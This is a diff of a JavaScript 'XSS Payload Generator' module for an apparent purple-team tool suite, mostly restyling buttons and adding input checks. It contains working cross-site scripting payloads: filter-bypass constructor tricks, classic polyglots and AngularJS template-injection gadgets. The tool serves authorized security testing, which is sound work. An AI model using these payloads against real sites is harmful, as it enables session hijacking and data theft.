@@ -1,7 +1,7 @@
 // ========================================
 // XSS PAYLOAD GENERATOR
 // Category: Purple Team
-// With PAT-inspired extensions (Filter, Polyglot, CSP, Angular)
+// Same visual style as SQLi tool
 // ========================================
 
 (function () {
@@ -9,24 +9,24 @@
 
     function render() {
         return `
-
         <div class="section-header">
-                <h3 class="mb-1 d-flex align-items-center gap-2">
-                    <i class="bi bi-bug-fill"></i>
-                    <span>XSS Payload Generator</span>
-                </h3>
-                <p class="text-secondary mb-0">
-                   Generate XSS proof-of-concept payloads for authorized security testing.
-                JavaScript is taken from the field below and inserted into each payload
-                <em>where applicable</em>.
-                </p>
-            </div>
-        
-        <div class="alert alert-warning">
-            <i class="bi bi-exclamation-triangle-fill"></i> 
-            <strong>Warning:</strong> Use these payloads only for authorized security testing and educational purposes.
+            <h3 class="mb-1 d-flex align-items-center gap-2">
+                <i class="bi bi-bug-fill"></i>
+                <span>XSS Payload Generator</span>
+            </h3>
+            <p class="text-secondary mb-0">
+              Generate XSS proof-of-concept payloads for authorized security testing.
+              JavaScript is taken from the field below and inserted into each payload
+              <em>where applicable</em>.
+            </p>
         </div>
-        
+
+        <div class="alert alert-warning">
+            <i class="bi bi-exclamation-triangle-fill"></i>
+            <strong>Warning:</strong>
+            Use these payloads only for authorized security testing and educational purposes.
+        </div>
+
         <div class="mb-3">
             <label for="xssInput" class="form-label">JavaScript code</label>
             <input 
@@ -40,7 +40,7 @@
                 The tool will validate it before generating payloads.
             </small>
         </div>
-        
+
         <div class="mb-3">
             <label class="form-label">Payload categories</label>
             <div class="row">
@@ -88,19 +88,19 @@
                 </div>
             </div>
         </div>
-        
-        <button class="btn btn-primary" id="generateBtn">
+
+        <button class="btn btn-success" id="xssGenerateBtn">
             <i class="bi bi-hammer"></i> Generate payloads
         </button>
-        
-        <button class="btn btn-primary ms-2" id="copyAllBtn">
+
+        <button class="btn btn-outline-info ms-2 d-none" id="xssCopyAllBtn">
             <i class="bi bi-clipboard"></i> Copy all
         </button>
-        
-        <button class="btn btn-primary ms-2" id="downloadBtn">
+
+        <button class="btn btn-outline-warning ms-2 d-none" id="xssDownloadBtn">
             <i class="bi bi-download"></i> Download wordlist
         </button>
-        
+
         <div id="xssResults" class="mt-4"></div>
     `;
     }
@@ -118,7 +118,6 @@
                 return { ok: false, error: 'Empty JavaScript snippet.' };
             }
             try {
-                // Accept statements, not just expressions
                 // eslint-disable-next-line no-new-func
                 new Function(code);
                 return { ok: true };
@@ -139,41 +138,34 @@
         function buildPatInspiredPayloads(baseJs, baseJsSingleEsc, baseJsDoubleEsc, categories) {
             const extra = [];
 
-            // ========= PAT Filter Bypass Highlights (1 - XSS Filter Bypass) =========
+            // ========= PAT Filter Bypass Highlights =========
             if (categories.filter) {
                 extra.push({
                     category: 'Filter Bypass (PAT-inspired)',
                     hint: 'Alternate evaluation and alert-disguising tricks, inspired by PayloadsAllTheThings filter bypass section.',
                     items: [
-                        // Various Function() / constructor tricks but with your JS inside.
                         `javascript:eval(''+${JSON.stringify('eval(' + JSON.stringify(baseJs) + ')')})`,
                         `<script>constructor.constructor('${baseJsSingleEsc}')()</script>`,
                         `<script>[].filter.constructor('${baseJsSingleEsc}')()</script>`,
-                        // Using window properties / dynamic access while still running your JS.
                         `<script>window['eval']('${baseJsSingleEsc}')</script>`,
-                        // Unicode-ish angle brackets idea (＜script＞) but using your JS inside.
                         '＜script＞' + baseJs + '＜/script＞'
                     ]
                 });
             }
 
-            // ========= PAT Polyglot Highlights (2 - XSS Polyglot) =========
+            // ========= PAT Polyglot Highlights =========
             if (categories.polyglot) {
-                // These are classic static polyglots. They purposely ignore baseJs and keep alert(1)
-                // because their structure is very fragile. Hints explain that.
                 extra.push({
                     category: 'Static Polyglots (PAT classics)',
                     hint: 'Classic multi-context XSS polyglots from PayloadsAllTheThings. They usually hard-code alert(1) and do NOT use the Base JS field.',
                     items: [
-                        // 0xsobky polyglot (slightly normalized)
                         `jaVasCript:/*-/*\`/*\\\`/*'/*\"/**/(/* */oncliCk=alert(1) )//%0D%0A//<svg/onload=alert(1)>`,
-                        // Ashar Javed style attribute / email polyglot (simplified)
                         `"-->@example.com'-->"><svg/onload=alert(1)>`
                     ]
                 });
             }
 
-            // ========= PAT WAF Bypass Highlights (3 - Common WAF Bypass) =========
+            // ========= PAT WAF Bypass Highlights =========
             if (categories.waf) {
                 extra.push({
                     category: 'Common WAF Bypass (PAT-inspired)',
@@ -188,10 +180,8 @@
                 });
             }
 
-            // ========= PAT CSP Bypass Highlights (4 - CSP Bypass) =========
+            // ========= PAT CSP Bypass Highlights =========
             if (categories.csp) {
-                // These are CSP-specific JSONP / gadget URLs. They are intentionally static and require
-                // manual tuning; baseJs does not naturally fit into them.
                 extra.push({
                     category: 'CSP / JSONP Snippets (PAT highlights)',
                     hint: 'Use when CSP whitelists specific JSONP endpoints. These examples are static; adapt manually and ignore the Base JS field here.',
@@ -204,17 +194,14 @@
                 });
             }
 
-            // ========= PAT Angular / Template Payloads (5 - XSS in Angular) =========
+            // ========= PAT Angular / Template Payloads =========
             if (categories.angular) {
                 extra.push({
                     category: 'Angular / AngularJS Template Payloads',
                     hint: 'Short AngularJS template injection primitives based on PayloadsAllTheThings. Require an AngularJS context (e.g. ng-app on page).',
                     items: [
-                        // Classic AngularJS 1.6+ style gadget but with your JS inside constructor.
                         `{{constructor.constructor('${baseJsSingleEsc}')()}}`,
-                        // Similar but via $eval constructor.
                         `{{$eval.constructor('${baseJsSingleEsc}')()}}`,
-                        // Vue / Angular gadget variant.
                         `{{[].pop.constructor('${baseJsSingleEsc}')()}}`
                     ]
                 });
@@ -224,20 +211,12 @@
         }
 
         function generatePayloads() {
+            const resultsDiv = document.getElementById('xssResults');
+            const copyAllBtn = document.getElementById('xssCopyAllBtn');
+            const downloadBtn = document.getElementById('xssDownloadBtn');
+
             const baseJs = getBaseJs();
             const validation = validateJs(baseJs);
-            const resultsDiv = document.getElementById('xssResults');
-
-            if (!validation.ok) {
-                resultsDiv.innerHTML = `
-                    <div class="alert alert-danger">
-                        <i class="bi bi-x-circle-fill"></i>
-                        Invalid JavaScript: <code>${window.escapeHtml(validation.error)}</code><br>
-                        <small>Tip: paste only JS (e.g. <code>alert(document.domain)</code>), not HTML.</small>
-                    </div>
-                `;
-                return;
-            }
 
             const categories = {
                 basic:    document.getElementById('catBasic').checked,
@@ -251,8 +230,34 @@
                 angular:  document.getElementById('catAngular').checked
             };
 
-            const payloads = [];
+            if (!validation.ok) {
+                resultsDiv.innerHTML = `
+                    <div class="alert alert-danger">
+                        <i class="bi bi-x-circle-fill"></i>
+                        Invalid JavaScript: <code>${window.escapeHtml(validation.error)}</code><br>
+                        <small>Tip: paste only JS (e.g. <code>alert(document.domain)</code>), not HTML.</small>
+                    </div>
+                `;
+                currentPayloads = [];
+                copyAllBtn.classList.add('d-none');
+                downloadBtn.classList.add('d-none');
+                return;
+            }
 
+            if (!Object.values(categories).some(Boolean)) {
+                resultsDiv.innerHTML = `
+                    <div class="alert alert-warning">
+                        <i class="bi bi-exclamation-circle-fill"></i>
+                        Please select at least one payload category.
+                    </div>
+                `;
+                currentPayloads = [];
+                copyAllBtn.classList.add('d-none');
+                downloadBtn.classList.add('d-none');
+                return;
+            }
+
+            const payloads = [];
             const baseJsSingleEsc = baseJs.replace(/'/g, "\\'");
             const baseJsDoubleEsc = baseJs.replace(/"/g, '\\"');
 
@@ -411,32 +416,45 @@
 
             currentPayloads = payloads;
 
+            if (!payloads.length) {
+                resultsDiv.innerHTML = `
+                    <div class="alert alert-info">
+                        <i class="bi bi-info-circle-fill"></i>
+                        No payloads generated. Check your category selections.
+                    </div>
+                `;
+                copyAllBtn.classList.add('d-none');
+                downloadBtn.classList.add('d-none');
+                return;
+            }
+
+            // -------- RENDER RESULTS (same style as SQLi tool) --------
             let html = '<div class="accordion" id="xssAccordion">';
             let totalPayloads = 0;
 
             payloads.forEach((category, idx) => {
                 totalPayloads += category.items.length;
-                const collapseId = `collapse${idx}`;
+                const collapseId = `xssCollapse${idx}`;
                 const isFirst = idx === 0;
 
                 html += `
-                <div class="accordion-item" style="background-color: #1a1d29; border-color: #2d3748;">
+                <div class="accordion-item" style="background-color: var(--terminal-card); border-color: var(--terminal-border);">
                     <h2 class="accordion-header">
-                        <button class="accordion-button ${isFirst ? '' : 'collapsed'}" type="button" data-bs-toggle="collapse" data-bs-target="#${collapseId}" style="background-color: #2563eb; color: white;">
+                        <button class="accordion-button ${isFirst ? '' : 'collapsed'}" type="button" data-bs-toggle="collapse" data-bs-target="#${collapseId}" style="background-color: rgba(0, 255, 136, 0.15); color: var(--terminal-accent); border-color: var(--terminal-accent);">
                             <i class="bi bi-folder-fill me-2"></i> ${category.category} (${category.items.length} payloads)
                         </button>
                     </h2>
                     <div id="${collapseId}" class="accordion-collapse collapse ${isFirst ? 'show' : ''}" data-bs-parent="#xssAccordion">
-                        <div class="accordion-body" style="background-color: #1a1d29;">
+                        <div class="accordion-body" style="background-color: var(--terminal-card);">
                             <p class="text-secondary small mb-3">${category.hint}</p>
                 `;
 
-                category.items.forEach((payload) => {
+                category.items.forEach(payload => {
                     html += `
                     <div class="mb-2">
-                        <div class="code-block position-relative" style="background-color: #0f1419; padding: 12px; border-radius: 6px; border: 1px solid #2d3748;">
-                            <code class="text-break" style="color: #e2e8f0;">${window.escapeHtml(payload)}</code>
-                            <button class="btn btn-sm btn-outline-primary position-absolute top-0 end-0 m-1 copy-payload-btn" data-payload-text="${escapeAttr(payload)}">
+                        <div class="code-block position-relative" style="background-color: var(--terminal-surface); padding: 12px; border-radius: 6px; border: 1px solid var(--terminal-border);">
+                            <code class="text-break" style="color: var(--terminal-accent);">${window.escapeHtml(payload)}</code>
+                            <button class="btn btn-sm btn-outline-success position-absolute top-0 end-0 m-1 xss-copy-payload-btn" data-payload-text="${escapeAttr(payload)}">
                                 <i class="bi bi-clipboard"></i>
                             </button>
                         </div>
@@ -467,27 +485,36 @@
 
             resultsDiv.innerHTML = html;
 
-            document.querySelectorAll('.copy-payload-btn').forEach(btn => {
-                btn.addEventListener('click', function () {
-                    const payload = this.getAttribute('data-payload-text');
-                    const textarea = document.createElement('textarea');
-                    textarea.value = payload;
-                    document.body.appendChild(textarea);
-                    textarea.select();
-                    document.execCommand('copy');
-                    document.body.removeChild(textarea);
+            copyAllBtn.classList.remove('d-none');
+            downloadBtn.classList.remove('d-none');
+            
+            // Copy single XSS payload
+document.querySelectorAll('.xss-copy-payload-btn').forEach(btn => {
+    btn.addEventListener('click', function () {
+        // get payload from the <code> element text
+        const codeEl = this.closest('.code-block')?.querySelector('code');
+        const payload = codeEl ? codeEl.textContent : '';
 
-                    const originalHtml = this.innerHTML;
-                    this.innerHTML = '<i class="bi bi-check-fill"></i>';
-                    this.classList.add('btn-success');
-                    this.classList.remove('btn-outline-primary');
-                    setTimeout(() => {
-                        this.innerHTML = originalHtml;
-                        this.classList.remove('btn-success');
-                        this.classList.add('btn-outline-primary');
-                    }, 2000);
-                });
-            });
+        const textarea = document.createElement('textarea');
+        textarea.value = payload;
+        document.body.appendChild(textarea);
+        textarea.select();
+        document.execCommand('copy');
+        document.body.removeChild(textarea);
+
+        // animation: outline-success -> solid success, then back
+        const originalHtml = this.innerHTML;
+        this.innerHTML = '<i class="bi bi-check-circle-fill"></i>';
+        this.classList.remove('btn-outline-success');
+        this.classList.add('btn-success');
+
+        setTimeout(() => {
+            this.innerHTML = originalHtml;
+            this.classList.remove('btn-success');
+            this.classList.add('btn-outline-success');
+        }, 2000);
+    });
+});
         }
 
         function copyAllPayloads() {
@@ -510,15 +537,15 @@
             document.execCommand('copy');
             document.body.removeChild(textarea);
 
-            const btn = document.getElementById('copyAllBtn');
+            const btn = document.getElementById('xssCopyAllBtn');
             const originalHtml = btn.innerHTML;
             btn.innerHTML = '<i class="bi bi-check-fill"></i> Copied!';
-            btn.classList.remove('btn-primary');
+            btn.classList.remove('btn-info');
             btn.classList.add('btn-success');
             setTimeout(() => {
                 btn.innerHTML = originalHtml;
                 btn.classList.remove('btn-success');
-                btn.classList.add('btn-primary');
+                btn.classList.add('btn-info');
             }, 2000);
         }
 
@@ -546,21 +573,21 @@
             document.body.removeChild(a);
             URL.revokeObjectURL(url);
 
-            const btn = document.getElementById('downloadBtn');
+            const btn = document.getElementById('xssDownloadBtn');
             const originalHtml = btn.innerHTML;
             btn.innerHTML = '<i class="bi bi-check-fill"></i> Downloaded!';
-            btn.classList.remove('btn-primary');
+            btn.classList.remove('btn-warning');
             btn.classList.add('btn-success');
             setTimeout(() => {
                 btn.innerHTML = originalHtml;
                 btn.classList.remove('btn-success');
-                btn.classList.add('btn-primary');
+                btn.classList.add('btn-warning');
             }, 2000);
         }
 
-        document.getElementById('generateBtn').addEventListener('click', generatePayloads);
-        document.getElementById('copyAllBtn').addEventListener('click', copyAllPayloads);
-        document.getElementById('downloadBtn').addEventListener('click', downloadWordlist);
+        document.getElementById('xssGenerateBtn').addEventListener('click', generatePayloads);
+        document.getElementById('xssCopyAllBtn').addEventListener('click', copyAllPayloads);
+        document.getElementById('xssDownloadBtn').addEventListener('click', downloadWordlist);
     }
 
     window.registerCyberSuiteTool({
